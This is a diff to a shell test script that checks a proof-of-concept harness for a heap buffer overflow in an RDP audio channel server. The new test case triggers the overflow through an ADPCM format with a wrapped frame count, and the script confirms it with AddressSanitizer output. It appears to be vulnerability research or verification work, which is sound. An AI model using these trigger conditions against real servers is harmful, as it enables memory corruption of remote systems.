@@ -144,7 +144,7 @@ grep -q 'readback offset 8819=11 offset 8820=de offset 21384=ad' \
     "$WORK/dispatch_chosen.out" || fail 'dispatch chosen: markers'
 grep -q 'out_pending_frames=8192 out_frames=0xfffffffffffffff0' \
     "$WORK/dispatch_chosen.out" || fail 'dispatch chosen: wrapped state'
-grep -q '\[dispatch\] chosen RESULT=PASS' "$WORK/dispatch_chosen.out" ||
+grep -q '\[dispatch\] mode=dvi chosen RESULT=PASS' "$WORK/dispatch_chosen.out" ||
     fail 'dispatch chosen: result'
 
 timeout 60 "$WORK/PocRdpsndChannelDispatch" benign > "$WORK/dispatch_benign.out" 2>&1 ||
@@ -153,14 +153,46 @@ grep -q 'handle_header rc=0 handle_body rc=0 reads=3 msgType=7 nformats=1' \
     "$WORK/dispatch_benign.out" || fail 'dispatch benign: framing'
 grep -q 'out_frames=0x000000000000089d' "$WORK/dispatch_benign.out" ||
     fail 'dispatch benign: wrapped state unexpectedly'
-grep -q '\[dispatch\] benign RESULT=PASS' "$WORK/dispatch_benign.out" ||
+grep -q '\[dispatch\] mode=benign benign RESULT=PASS' "$WORK/dispatch_benign.out" ||
     fail 'dispatch benign: result'
+
+
+# WAVE_FORMAT_ADPCM nBlockAlign=8, nChannels=2: a tag the stock shadow
+# server's default format list offers, so Activated can select it without a
+# DVI_ADPCM precondition. Same real dispatcher and WTS stub as above.
+ASAN_OPTIONS="$ASAN" timeout 60 "$WORK/PocRdpsndChannelDispatchAsan" adpcm \
+    > "$WORK/dispatch_adpcm_asan.out" 2>&1 || true
+grep -q 'parsed\[1\]: tag=2 channels=2 blockalign=8 cbsize=0' \
+    "$WORK/dispatch_adpcm_asan.out" || fail 'dispatch ADPCM: parsed record'
+grep -q 'out_frames=0xfffffffffffffffc' "$WORK/dispatch_adpcm_asan.out" ||
+    fail 'dispatch ADPCM: wrapped frames'
+grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' \
+    "$WORK/dispatch_adpcm_asan.out" || fail 'dispatch ADPCM: no overflow'
+grep -q 'WRITE of size 16384' "$WORK/dispatch_adpcm_asan.out" ||
+    fail 'dispatch ADPCM: wrong write size'
+grep -q '0 bytes after 8820-byte region' "$WORK/dispatch_adpcm_asan.out" ||
+    fail 'dispatch ADPCM: wrong region size'
+grep -q 'rdpsnd_server_send_samples' "$WORK/dispatch_adpcm_asan.out" ||
+    fail 'dispatch ADPCM: wrong write frame'
+
+timeout 60 "$WORK/PocRdpsndChannelDispatch" adpcm \
+    > "$WORK/dispatch_adpcm.out" 2>&1 || fail 'dispatch ADPCM PoC failed'
+grep -q 'parsed\[1\]: tag=2 channels=2 blockalign=8 cbsize=0' \
+    "$WORK/dispatch_adpcm.out" || fail 'dispatch ADPCM plain: parsed record'
+grep -q 'out_frames=0xfffffffffffffffc out_buffer_size=8820' \
+    "$WORK/dispatch_adpcm.out" || fail 'dispatch ADPCM plain: wrapped state'
+grep -q 'readback offset 8819=11 offset 8820=de offset 21384=ad' \
+    "$WORK/dispatch_adpcm.out" || fail 'dispatch ADPCM plain: markers'
+grep -q '\[dispatch\] mode=adpcm chosen RESULT=PASS' \
+    "$WORK/dispatch_adpcm.out" || fail 'dispatch ADPCM plain: result'
 
 echo 'ALL REAL-LIBRARY CHECKS PASS'
 echo "vulnerable: $WORK/poc.out"
 echo "control:    $WORK/pcm.out"
 echo "wire:       $WORK/wire.out"
 echo "chosen:     $WORK/chosen.out"
-echo "dispatch asan:   $WORK/dispatch_asan.out"
-echo "dispatch chosen: $WORK/dispatch_chosen.out"
-echo "dispatch benign: $WORK/dispatch_benign.out"
+echo "dispatch asan:        $WORK/dispatch_asan.out"
+echo "dispatch chosen:      $WORK/dispatch_chosen.out"
+echo "dispatch benign:      $WORK/dispatch_benign.out"
+echo "dispatch adpcm asan:  $WORK/dispatch_adpcm_asan.out"
+echo "dispatch adpcm plain: $WORK/dispatch_adpcm.out"
